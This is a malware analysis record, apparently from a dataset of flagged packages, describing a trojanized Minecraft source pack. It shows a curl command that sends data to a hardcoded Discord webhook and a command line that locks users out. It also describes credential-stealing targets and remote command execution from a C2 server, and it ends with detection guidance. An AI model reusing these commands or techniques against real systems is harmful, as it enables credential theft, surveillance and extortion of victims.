package_info.package_manager: WinRAR self-extract (Windows malware, not a package manager)
package_info.why_malicious: The package is a trojanized Minecraft source pack distributed as a WinRAR self-extracting archive. It contains multiple malicious scripts and binaries that steal sensitive information, exfiltrate data to attacker-controlled Discord webhooks and C2 servers, establish persistence via registry autorun, disable user defenses such as Task Manager and Explorer, enable remote command execution, and lock out users for extortion.

execution_context.trigger: runtime (on execution of extracted files, typically on C2 command)

malicious_snippets.code_snippet: curl -s --ssl-no-revoke -X POST -H "Content-type: application/json" --data "{\"content\": \"\n*** [⚠] USERNAME = SYSTEM LOCK X , VICTIM SEES AN ERROR ⚠***\"}" https://discord.com/api/webhooks/1117543783714787458/U_DdPjJm7rM7Q2asPiMISLTrbd3oGw3oVQ25_XU37HCmM6QIQ804SJAH4_h0AT2Vr_cv
malicious_snippets.code_behavior: At runtime, when triggered by a C2 command, the script sends a POST request with system lock status to a hardcoded Discord webhook, exfiltrating lock event data to the attacker, enabling extortion or further malicious action.

malice_analysis.why_suspicious: The script exfiltrates system lock status to an external Discord webhook, a technique commonly used by malware for C2 communication and extortion monitoring.
malice_analysis.violated_expectations: Legitimate scripts should never send system lock or error notifications to external, attacker-controlled webhooks, especially not Discord endpoints.
malice_analysis.similar_legitimate_use: Automated system monitoring tools may send alerts to webhooks, but never for malicious lock events or to untrusted, hardcoded endpoints.
key_indicators: Hardcoded Discord webhook URL for exfiltration
Script hidden in ProgramData directory
Transmission of system lock status externally
Use of curl with suppressed SSL checks

execution_context.trigger: runtime (immediately after extraction and on system startup via autorun)

malicious_snippets.code_behavior: At runtime and on system startup, the script forcefully terminates Task Manager processes, preventing the user from terminating malicious processes and impeding remediation.

malice_analysis.why_suspicious: Malware frequently disables system utilities like Task Manager to prevent detection and removal, ensuring its persistence.
malice_analysis.violated_expectations: Legitimate software should not interfere with or repeatedly kill system management tools such as Task Manager.
malice_analysis.similar_legitimate_use: Some parental control or kiosk software may restrict Task Manager, but not in this context and not via hidden batch scripts.
key_indicators: Repeated forced termination of Task Manager
Persistence via registry autorun for batch script
Obfuscated or hidden batch file in ProgramData

execution_context.trigger: runtime (immediately after extraction and on system startup via autorun)

malicious_snippets.code_behavior: At runtime and on system startup, the script captures a screenshot every five seconds using screenshot.exe, pipes the image to curl, and uploads it to a Discord webhook, resulting in continuous exfiltration of the victim's screen to the attacker.

malice_analysis.why_suspicious: Automated, periodic screenshot capture and exfiltration is a hallmark of surveillance malware, enabling attackers to monitor victim activity in real time.
malice_analysis.violated_expectations: Legitimate software should not capture and exfiltrate screenshots without explicit user consent, especially not to untrusted endpoints.
malice_analysis.similar_legitimate_use: Remote support tools may capture screens, but only with explicit user permission and to trusted servers.
key_indicators: Automated, periodic screenshot capture via external binary
Exfiltration of images to Discord webhook
Persistence via autorun in registry
Batch script and binary hidden in ProgramData

execution_context.trigger: runtime (immediately after extraction and on system startup via autorun, and on C2 command)

malicious_snippets.code_behavior: At runtime and on C2 command, the script downloads remote commands from a C2 server using curl and pipes them directly to cmd.exe for execution, enabling full remote control of the victim's system by the attacker.

malice_analysis.why_suspicious: Remote command execution from an unauthenticated external server is a core capability of RATs and is highly malicious, allowing attackers to execute arbitrary code.
malice_analysis.violated_expectations: Legitimate software should not execute arbitrary remote commands from untrusted sources without authentication or validation.
malice_analysis.similar_legitimate_use: Enterprise management tools may execute remote scripts, but only from trusted, authenticated sources and with user/admin consent.
key_indicators: Downloads and executes remote commands via curl and cmd.exe
C2 server hosted on free web hosting (000webhostapp.com)
No authentication or validation of downloaded commands
Batch script hidden in ProgramData

execution_context.trigger: runtime (on execution of stealer binary after extraction)
execution_context.file_location: Main stealer binary (extracted from WinRAR SFX)

malicious_snippets.code_snippet: Copy browser data (Login Data, Cookies, History, Bookmarks) from Chrome, Opera, Brave, Vivaldi, Edge, Firefox profile paths; Copy Discord tokens from %appdata%\discord\Local Storage\leveldb; Copy Steam, osu!, Roblox, Growtopia, Discord data; Search Downloads for files with keywords (2fa, password, seed, etc.); Compress all into STEALER.zip; Exfiltrate via Discord webhook.
malicious_snippets.code_behavior: At runtime, the stealer binary collects sensitive data from browsers, games, and chat clients, searches for credentials and cryptocurrency wallets in user directories, compresses the data into STEALER.zip, and exfiltrates the archive to attacker-controlled Discord webhooks.

malice_analysis.why_suspicious: Bulk theft of credentials, tokens, and sensitive files from multiple applications, followed by exfiltration to external servers, is a primary indicator of infostealer malware.
malice_analysis.violated_expectations: Legitimate software should not access or exfiltrate user credentials, tokens, or sensitive files to untrusted endpoints.
malice_analysis.similar_legitimate_use: Backup tools may access user data, but do not exfiltrate it to attacker-controlled webhooks or compress it for unauthorized transfer.
key_indicators: Access to browser and application credential stores
Keyword-based search for sensitive files in Downloads
Compression of stolen data into archive
Exfiltration to Discord webhooks

malicious_snippets.code_snippet: msg * 'Do not restart your computer'; taskkill /f /im explorer.exe; start bsod.hta
malicious_snippets.code_behavior: At runtime, when triggered by a C2 command, the script displays a warning message, forcefully terminates the Windows Explorer shell, and launches a fullscreen blank window via bsod.hta, effectively locking the user out of their system and preventing normal use.

malice_analysis.why_suspicious: System lock and user interface disruption are common in ransomware and extortion attacks, preventing victims from accessing their systems.
malice_analysis.violated_expectations: Legitimate software should not forcibly lock users out of their systems or kill essential processes like explorer.exe.
malice_analysis.similar_legitimate_use: Kiosk or parental control software may restrict access, but not in a deceptive or extortionate manner and not via hidden scripts.
key_indicators: Forced termination of explorer.exe
Display of persistent fullscreen window via HTA
Combined with Task Manager killer for complete lockout
Hidden batch and HTA files in ProgramData

attack_chain.action: User downloads and executes the trojanized Minecraft source pack (WinRAR SFX).
Malware performs anti-analysis checks (blacklist of usernames/processes).
attack_chain.leads_to: Conditional execution of stealer and dropped scripts

attack_chain.action: Stealer collects sensitive data from browsers, games, chat clients, and searches for credentials.
Collected data is compressed into STEALER.zip and exfiltrated to Discord webhooks.
Persistence established via registry autorun for key scripts (debugerkiller.bat, Screen.bat, RAT.bat).
Continuous screenshot capture and exfiltration to Discord webhook.
Remote commands executed via RAT.bat from C2 server.
On C2 command, system lock scripts are triggered, locking the user out and sending status to attacker.

behavioral_signatures: Creation and execution of batch scripts in C:\ProgramData that kill Task Manager or Explorer.exe
Frequent, automated screenshot capture and exfiltration to Discord webhooks
Bulk access to browser, game, and chat client credential stores and files
Compression of user data into archives (e.g., STEALER.zip) and exfiltration to external endpoints
Remote command execution via downloaded scripts from free web hosting domains (e.g., 000webhostapp.com)
Persistence established via registry autorun for non-standard scripts in ProgramData
network_indicators: Connections to Discord webhooks (discord.com/api/webhooks/1117543783714787458/U_DdPjJm7rM7Q2asPiMISLTrbd3oGw3oVQ25_XU37HCmM6QIQ804SJAH4_h0AT2Vr_cv and similar)
detection_knowledge.how_to_detect: Monitor for the creation and execution of suspicious batch and script files in C:\ProgramData, especially those that kill system processes (Task Manager, Explorer.exe) or capture screenshots. Detect outbound connections to Discord webhooks and known C2 domains such as 000webhostapp.com. Look for bulk access to browser and application credential stores, the creation of compressed archives (e.g., STEALER.zip) containing user data, and persistence via registry autorun for non-standard scripts. Correlate these behaviors to identify coordinated malicious activity.
